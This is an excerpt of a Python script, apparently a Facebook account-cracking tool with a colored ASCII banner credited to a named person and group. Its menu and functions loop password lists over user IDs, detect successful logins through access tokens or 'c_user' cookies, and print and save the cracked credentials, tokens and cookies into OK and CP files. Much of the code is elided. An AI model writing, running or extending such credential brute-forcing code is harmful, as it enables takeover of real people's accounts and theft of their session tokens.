...
\x1b[0;31m  ______           __    __    
\x1b[0;32m /      \         |  \  |  \   
\x1b[0;33m|  $$$$$$\        | $$  | $$
\x1b[0;34m| $$__| $$ ______ | $$__| $$   
\x1b[0;35m| $$    $$|      \| $$    $$     
\x1b[0;36m| $$$$$$$$ \$$$$$$ \$$$$$$$$
\x1b[0;37m| $$  | $$              | $$  
\x1b[0;38m| $$  | $$              | $$
...
\x1b[0;33m║WELCOME BACK COUSIN 

\x1b[0;34m║#FACEBOOK : ARIANNE AURELIO 
\x1b[0;33m║#FB GROUP :  AURELIO BLOOD                
...
def menu():
	...
	print("\033[1;93m[\033[1;94m00\033[1;94m] Exit\033[1;97m [ \033[1;91AURELIO EMEO TOKEN \033[1;97m]")
	...
	elif ARIANNE  == "1" or AURELIO == "01":

		publik()

		method()

	elif AURELIO  == "2" or ARIANNE  == "02":

		follower()

		method()

	elif AURELIO  == "3" or ARIANNE    == "03":

		massal()

		method()

	elif AURELIO  == "4" or ARIANNE  == "04":
	...
	elif AURELIO  == "5" or ARIANNE  == "05":

		setting_ua()

	elif AURELIO  == "0" or ARIANNE  == "00":
...
def method():
	...
	print("\033[1;93m[\033[1;94m1\033[1;97m] B-API\033[1;97m [ \033[1;95mAURELIO  ARIANNE /FASTER \033[1;97m]")
...
def cek_ttl_cp(uid, pw):
	...
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\033[0;95m[AURELIO-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
	...
	try:
		...
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				print("\r\033[0;94m[ARIANNE -OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				...
				print("\r\033[0;96m[ARIANNE -CP] %s|%s\033[0;92m        "%(uid, pw))

				cp.append("%s|%s"%(uid, pw))

				open("CP/%s.txt"%(tARIANNE ),"a").write(" + %s|%s\n"%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[AURELIO-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				...
				print("\r\033[0;96m[ARIANNE -CP] %s|%s\033[0;96m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[ARIANNE -OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))

				ok.append("%s|%s"%(uid, pw))

				open("OK/%s.txt"%(tARIANNE ),"a").write(" + %s|%s\n"%(uid, pw))
				...
				print("\r\033[0;96m[ARIANNE -CP] %s|%s\033[0;91m        "%(uid, pw))
...
def manual():
	...
	print("\n[+] Type , For 2nd Password For Example : AurelioAurelio,@@&&@@,114477,This sample password etc")
		...
		try:
			...
			for pw in asu:
				...
				if "c_user" in ses.cookies.get_dict().keys():
					...
					print("\r\033[0;94m[AURELIO -OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
